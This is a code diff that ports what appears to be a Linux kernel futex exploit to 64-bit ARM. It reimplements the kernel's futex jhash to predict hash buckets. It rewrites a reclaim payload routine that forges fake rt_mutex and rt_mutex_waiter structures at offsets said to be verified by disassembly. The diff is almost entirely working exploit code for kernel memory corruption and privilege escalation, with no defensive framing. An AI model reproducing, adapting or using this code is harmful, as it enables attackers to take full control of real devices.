@@ -126,36 +126,46 @@ static inline uint32_t ks_rol(uint32_t x, unsigned s) {
     return (x << (s & 31)) | (x >> ((32 - s) & 31));
 }
 
-static uint32_t g_hash_len = 2, g_hash_seed = 0xdeadbeefu, g_hash_mask = 0x3ffu;
+static uint32_t g_hash_len = 4, g_hash_seed = 0xdeadbeefu, g_hash_mask = 0x7ffu;
 
 static inline uint32_t ks_hash(uintptr_t addr, uint32_t mm) {
-    uint32_t page = (uint32_t)addr & ~(KS_PAGE - 1);
-    uint32_t off = (uint32_t)addr & (KS_PAGE - 1);
-    uint32_t base = g_hash_seed + (g_hash_len << 2) + off;
-    uint32_t a = base, b = base, c = base;
-    if (g_hash_len >= 3) {
+    /* 64-bit jhash2 with 4 words (aarch64 kernel futex):
+     *   k[0] = low32(page-aligned word)
+     *   k[1] = high32(page-aligned word)
+     *   k[2] = low32(mm pointer)
+     *   k[3] = high32(mm pointer) -- assume 0 for physical mm addresses
+     *   initval = word & (PAGE_SIZE - 1)
+     */
+    uint32_t page_lo = (uint32_t)(addr & ~(uintptr_t)(KS_PAGE - 1));
+    uint32_t page_hi = (uint32_t)((uint64_t)(addr & ~(uintptr_t)(KS_PAGE - 1)) >> 32);
+    uint32_t off     = (uint32_t)(addr & (KS_PAGE - 1));
+    uint32_t mm_lo   = mm;
+    uint32_t mm_hi   = 0;
 
-        a += mm;
-        c += page;
-    } else {
+    uint32_t a, b, c;
+    a = b = c = 0xdeadbeefu + (4u << 2) + off;
 
-        a += page;
-        b += mm;
-    }
-    c ^= b;
-    c -= ks_rol(b, 14);
-    a ^= c;
-    a -= ks_rol(c, 11);
-    b ^= a;
-    b -= ks_rol(a, 25);
-    c ^= b;
-    c -= ks_rol(b, 16);
-    a ^= c;
-    a -= ks_rol(c, 4);
-    b ^= a;
-    b -= ks_rol(a, 14);
-    c ^= b;
-    c -= ks_rol(b, 24);
+    /* __jhash_mix (3 rounds, applied after k[0..2]) */
+    a += page_lo;
+    b += page_hi;
+    c += mm_lo;
+    a -= c;  a ^= ks_rol(c, 4);   c += b;
+    b -= a;  b ^= ks_rol(a, 6);   a += c;
+    c -= b;  c ^= ks_rol(b, 8);   b += a;
+    a -= c;  a ^= ks_rol(c, 16);  c += b;
+    b -= a;  b ^= ks_rol(a, 19);  a += c;
+    c -= b;  c ^= ks_rol(b, 4);   b += a;
+
+    /* k[3] then __jhash_final */
+    a += mm_hi;
+    c ^= b;  c -= ks_rol(b, 14);
+    a ^= c;  a -= ks_rol(c, 11);
+    b ^= a;  b -= ks_rol(a, 25);
+    c ^= b;  c -= ks_rol(b, 16);
+    a ^= c;  a -= ks_rol(c, 4);
+    b ^= a;  b -= ks_rol(a, 14);
+    c ^= b;  c -= ks_rol(b, 24);
+
     return c & g_hash_mask;
 }
 
@@ -226,14 +236,22 @@ static void fill_reclaim_payload(uint8_t *p, uint32_t page_base) {
     uint32_t waiter = page_base + 0x140;
     uint32_t task = page_base + 0x400;
 
-    *(uint32_t *)(p + 0x100 + 0x04) = waiter;
-    *(uint32_t *)(p + 0x100 + 0x08) = waiter;
-    *(uint32_t *)(p + 0x100 + 0x0c) = task | 1u;
+    // NEW (64-bit rt_mutex with rb_root_cached — owner at 0x18 matches disasm):
+    *(uint64_t *)(p + 0x100 + 0x08) = waiter;              /* waiters.rb_root.rb_node */
+    *(uint64_t *)(p + 0x100 + 0x10) = waiter;              /* waiters.rb_leftmost     */
+    *(uint64_t *)(p + 0x100 + 0x18) = (uint64_t)task | 1u; /* owner | HAS_WAITERS     */
 
-    *(uint32_t *)(p + 0x140 + 0x00) = 1;
-    *(uint32_t *)(p + 0x140 + 0x18) = g_profile.pi_task;
-    *(uint32_t *)(p + 0x140 + 0x1c) = lock;
-    *(uint32_t *)(p + 0x140 + 0x20) = 0;
+    /* 64-bit rt_mutex_waiter layout (verified via rt_mutex_adjust_prio_chain disasm):
+     *   0x00: tree_entry (rb_node, 24 bytes)
+     *   0x18: pi_tree_entry (rb_node, 24 bytes)
+     *   0x30: task  (8 bytes)
+     *   0x38: lock  (8 bytes)
+     *   0x40: prio  (4 bytes)
+     */
+    *(uint64_t *)(p + 0x140 + 0x00) = 1;                          /* rb_parent_color */
+    *(uint64_t *)(p + 0x140 + 0x30) = (uint64_t)g_profile.pi_task;/* waiter->task  */
+    *(uint64_t *)(p + 0x140 + 0x38) = (uint64_t)lock;             /* waiter->lock  */
+    *(uint32_t *)(p + 0x140 + 0x40) = 0;                          /* waiter->prio  */
 
     *(uint32_t *)(p + 0x400 + 0x08) = 0x100;
     *(uint32_t *)(p + 0x400 + g_profile.task_prio_off) = 120;
